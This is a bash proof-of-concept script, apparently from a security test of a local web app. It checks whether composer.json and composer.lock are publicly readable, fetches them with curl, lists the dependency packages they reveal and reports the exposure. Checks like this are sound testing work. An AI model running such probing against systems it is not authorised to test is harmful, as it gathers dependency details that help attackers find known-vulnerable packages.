#!/bin/bash

# POC: Exposed composer.json and composer.lock Information Disclosure
# This script demonstrates that sensitive composer configuration files are publicly accessible
# allowing attackers to enumerate dependencies and identify known vulnerabilities

TARGET_URL="http://localhost:8081"
COMPOSER_JSON="${TARGET_URL}/composer.json"
COMPOSER_LOCK="${TARGET_URL}/composer.lock"

echo "=========================================="
echo "Composer Files Information Disclosure POC"
echo "=========================================="
echo ""

# Test 1: Fetch composer.json
echo "[*] Attempting to fetch composer.json..."
echo "URL: $COMPOSER_JSON"
RESPONSE_JSON=$(curl -s -w "\n%{http_code}" "$COMPOSER_JSON")
HTTP_CODE_JSON=$(echo "$RESPONSE_JSON" | tail -1)
BODY_JSON=$(echo "$RESPONSE_JSON" | head -n -1)

echo "HTTP Status: $HTTP_CODE_JSON"
echo ""

if [ "$HTTP_CODE_JSON" = "200" ]; then
    echo "[+] SUCCESS: composer.json is publicly accessible!"
    echo ""
    echo "Content of composer.json:"
    echo "---"
    echo "$BODY_JSON"
    echo "---"
    echo ""
else
    echo "[-] composer.json returned HTTP $HTTP_CODE_JSON"
fi

echo ""
echo "[*] Attempting to fetch composer.lock..."
echo "URL: $COMPOSER_LOCK"
RESPONSE_LOCK=$(curl -s -w "\n%{http_code}" "$COMPOSER_LOCK")
HTTP_CODE_LOCK=$(echo "$RESPONSE_LOCK" | tail -1)
BODY_LOCK=$(echo "$RESPONSE_LOCK" | head -n -1)

echo "HTTP Status: $HTTP_CODE_LOCK"
echo ""

if [ "$HTTP_CODE_LOCK" = "200" ]; then
    echo "[+] SUCCESS: composer.lock is publicly accessible!"
    echo ""
    echo "Content of composer.lock (first 50 lines):"
    echo "---"
    echo "$BODY_LOCK" | head -50
    echo "---"
    echo ""
else
    echo "[-] composer.lock returned HTTP $HTTP_CODE_LOCK"
fi

# Analyze sensitive information
echo ""
echo "[*] Analyzing exposed dependency information..."
echo ""

if [ "$HTTP_CODE_JSON" = "200" ]; then
    echo "[+] Extracting dependency versions from composer.json:"
    if echo "$BODY_JSON" | grep -q "twig/twig"; then
        echo "    - Twig detected"
    fi
    if echo "$BODY_JSON" | grep -q "minimum-stability"; then
        echo "    - Minimum stability setting exposed"
    fi
fi

if [ "$HTTP_CODE_LOCK" = "200" ]; then
    echo "[+] Extracting dependency versions from composer.lock:"
    
    # Extract and display all package versions
    PACKAGES=$(echo "$BODY_LOCK" | grep -o '"name": "[^"]*"' | cut -d'"' -f4 | sort -u)
    
    if [ -n "$PACKAGES" ]; then
        echo "    Packages found:"
        echo "$PACKAGES" | head -20 | sed 's/^/      - /'
        TOTAL_PACKAGES=$(echo "$PACKAGES" | wc -l)
        echo "    Total packages: $TOTAL_PACKAGES"
    fi
fi

echo ""
echo "[*] Vulnerability Summary:"
echo "    - composer.json accessible: $([ "$HTTP_CODE_JSON" = "200" ] && echo "YES ⚠️" || echo "NO ✓")"
echo "    - composer.lock accessible: $([ "$HTTP_CODE_LOCK" = "200" ] && echo "YES ⚠️" || echo "NO ✓")"
echo ""

# Exit with status indicating if vulnerability was found
if [ "$HTTP_CODE_JSON" = "200" ] || [ "$HTTP_CODE_LOCK" = "200" ]; then
    echo "[!] VULNERABILITY CONFIRMED: Composer files are publicly exposed!"
    exit 0
else
    echo "[-] Files are not publicly accessible"
    exit 1
fi